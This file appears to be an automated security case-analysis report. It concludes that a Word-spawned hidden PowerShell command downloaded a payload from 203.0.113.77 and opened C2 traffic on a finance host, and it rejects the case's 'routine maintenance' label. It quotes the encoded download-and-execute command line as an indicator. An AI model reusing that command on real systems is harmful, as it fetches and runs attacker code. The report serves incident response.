@@ -1,0 +1,170 @@
+{
+  "verdict": "True Positive",
+  "severity": "High",
+  "impact": "High",
+  "priority": "High",
+  "confidence": "High",
+  "digest": "A PowerShell process, spawned by winword.exe on FIN-DB-02, executed a base64-encoded command to download and execute a payload from hxxps://203.0.113.77/update.dat. This was immediately followed by periodic outbound connections to the same IP address, indicating Command and Control activity. The maintenance team confirmed no legitimate activity on FIN-DB-02, contradicting the case's initial 'routine maintenance' claim.",
+  "affected_assets": [
+    {
+      "asset_type": "Hostname",
+      "asset_value": "FIN-DB-02"
+    },
+    {
+      "asset_type": "IP Address",
+      "asset_value": "10.20.8.42"
+    }
+  ],
+  "evidence_findings": [
+    {
+      "title": "Suspicious PowerShell Execution",
+      "finding_type": "Execution",
+      "subject": "FIN-DB-02",
+      "evidence": "A 'powershell.exe' process was observed on 'FIN-DB-02' with the command line 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZWJACkAbABpAGUAbgB0ACkA'. The parent process was 'winword.exe'.",
+      "conclusion": "The base64 encoded command decodes to 'IEX (New-Object Net.WebClient)', a common technique for downloading and executing content. The parent process 'winword.exe' is highly unusual for legitimate PowerShell execution, suggesting an initial compromise via a document.",
+      "source_paths": [
+        "source_data.child_containers[0].artifacts[0].cef.sourceHostName",
+        "source_data.child_containers[0].artifacts[0].cef.processName",
+        "source_data.child_containers[0].artifacts[0].cef.parentProcessName",
+        "source_data.child_containers[0].artifacts[0].cef.processCommandLine"
+      ]
+    },
+    {
+      "title": "Download and Execute Payload",
+      "finding_type": "Command Execution",
+      "subject": "hxxps://203.0.113.77/update.dat",
+      "evidence": "A note associated with the PowerShell process states: 'Decoded content invokes Net.WebClient to download and execute hxxps://203.0.113.77/update.dat'.",
+      "conclusion": "The PowerShell command was designed to retrieve and execute a malicious payload from an external, untrusted source.",
+      "source_paths": [
+        "source_data.child_containers[0].artifacts[0].notes[0].content"
+      ]
+    },
+    {
+      "title": "Outbound Command and Control (C2) Connection",
+      "finding_type": "Network Activity",
+      "subject": "203.0.113.77",
+      "evidence": "Outbound network connections from '10.20.8.42' (FIN-DB-02) to '203.0.113.77' on port '443' were observed with '120' connections over '30' seconds. A note states: 'The destination is not in the corporate allowlist and was observed receiving periodic connections immediately after PowerShell execution.'",
+      "conclusion": "The periodic connections to an unapproved external IP immediately following the suspicious PowerShell execution strongly indicate Command and Control (C2) activity.",
+      "source_paths": [
+        "source_data.child_containers[1].artifacts[0].cef.sourceAddress",
+        "source_data.child_containers[1].artifacts[0].cef.destinationAddress",
+        "source_data.child_containers[1].artifacts[0].cef.destinationPort",
+        "source_data.child_containers[1].artifacts[0].cef.connectionCount",
+        "source_data.child_containers[1].artifacts[0].cef.intervalSeconds",
+        "source_data.child_containers[1].artifacts[0].notes[0].content"
+      ]
+    },
+    {
+      "title": "Discrepancy with Stated Maintenance Activity",
+      "finding_type": "Contradictory Information",
+      "subject": "FIN-DB-02",
+      "evidence": "The case title and description claim 'Routine maintenance - known safe administrative activity' and 'Harmless approved maintenance.' However, a note states: 'No approved change references FIN-DB-02 or this command,' and 'The maintenance team confirmed it performed no work on FIN-DB-02.'",
+      "conclusion": "The technical evidence and confirmation from the maintenance team directly contradict the initial assessment, indicating malicious activity rather than legitimate maintenance.",
+      "source_paths": [
+        "title",
+        "description",
+        "source_data.child_containers[0].artifacts[0].notes[0].content",
+        "source_data.child_containers[1].artifacts[0].notes[0].content"
+      ]
+    }
+  ],
+  "attack_chain": [
+    {
+      "attack_stage": "Initial Access",
+      "description": "An unknown mechanism, likely involving a malicious document, led to 'winword.exe' spawning 'powershell.exe'."
+    },
+    {
+      "attack_stage": "Execution",
+      "description": "'powershell.exe' executed a base64-encoded command to download and execute a payload from an external server."
+    },
+    {
+      "attack_stage": "Command and Control",
+      "description": "The compromised host 'FIN-DB-02' established periodic outbound connections to '203.0.113.77' on port 443, indicating C2 communication."
+    }
+  ],
+  "attack_timeline": [
+    {
+      "timestamp": "2026-08-15T02:11:00Z",
+      "attack_behavior": "Suspicious PowerShell execution by 'winword.exe'.",
+      "evidence_field": "source_data.child_containers[0].artifacts[0].cef.processCommandLine"
+    },
+    {
+      "timestamp": "2026-08-15T02:11:00Z",
+      "attack_behavior": "Download and execution of payload from 'hxxps://203.0.113.77/update.dat'.",
+      "evidence_field": "source_data.child_containers[0].artifacts[0].notes[0].content"
+    },
+    {
+      "timestamp": "2026-08-15T02:11:00Z",
+      "attack_behavior": "Establishment of Command and Control (C2) connections to '203.0.113.77'.",
+      "evidence_field": "source_data.child_containers[1].artifacts[0].cef.destinationAddress"
+    }
+  ],
+  "ioc_indicators": [
+    {
+      "indicator_type": "IP Address",
+      "value": "203.0.113.77",
+      "context": "Destination for payload download and C2 communications."
+    },
+    {
+      "indicator_type": "URL",
+      "value": "hxxps://203.0.113.77/update.dat",
+      "context": "URL from which the malicious payload was downloaded."
+    },
+    {
+      "indicator_type": "Process Command Line",
+      "value": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZWJACkAbABpAGUAbgB0ACkA",
+      "context": "Malicious PowerShell command used for execution."
+    }
+  ],
+  "remediations": [
+    {
+      "action_type": "Containment",
+      "description": "Immediately isolate the host 'FIN-DB-02' from the network to prevent further compromise or lateral movement.",
+      "priority": "High"
+    },
+    {
+      "action_type": "Network Blocking",
+      "description": "Block all traffic to and from '203.0.113.77' at the network perimeter (firewall, proxy, IPS).",
+      "priority": "High"
+    },
+    {
+      "action_type": "Forensic Analysis",
+      "description": "Conduct a full forensic analysis of 'FIN-DB-02' to determine the extent of compromise, identify persistence mechanisms, and recover the 'update.dat' payload.",
+      "priority": "High"
+    },
+    {
+      "action_type": "Endpoint Detection and Response (EDR) Investigation",
+      "description": "Investigate how 'winword.exe' spawned 'powershell.exe' to identify the initial access vector (e.g., phishing email, malicious document).",
+      "priority": "Medium"
+    },
+    {
+      "action_type": "Threat Hunting",
+      "description": "Search for other instances of connections to '203.0.113.77' or similar PowerShell execution patterns across the environment.",
+      "priority": "Medium"
+    }
+  ],
+  "unknowns": [
+    "The specific contents and capabilities of the 'update.dat' payload.",
+    "The exact initial access vector that led to 'winword.exe' executing PowerShell.",
+    "Whether other systems in the environment are also compromised by this threat.",
+    "The full scope and impact of the compromise on 'FIN-DB-02'."
+  ],
+  "truncated_fields": [],
+  "case_analyzer_run": {
+    "generated_at": "2026-08-20T12:06:07.316809Z",
+    "package_version": "0.1.0",
+    "report_schema_version": "1",
+    "model": "gemini-2.5-flash",
+    "endpoint_host": "generativelanguage.googleapis.com",
+    "system_prompt_sha256": "cf4c5fd563d303572a1e23a012d8982bdf10515ac3a8d5bec5c9cc4ceb51365b",
+    "payload_sha256": "06737d97cd059e707c51bd8ae5ebadf5a9355abec03614cf14c0023717dba30a",
+    "input_file_sha256": "",
+    "has_enrichment": false,
+    "has_knowledge": false,
+    "has_user_input": false,
+    "checks": {
+      "ran": true,
+      "problems": []
+    }
+  }
+}
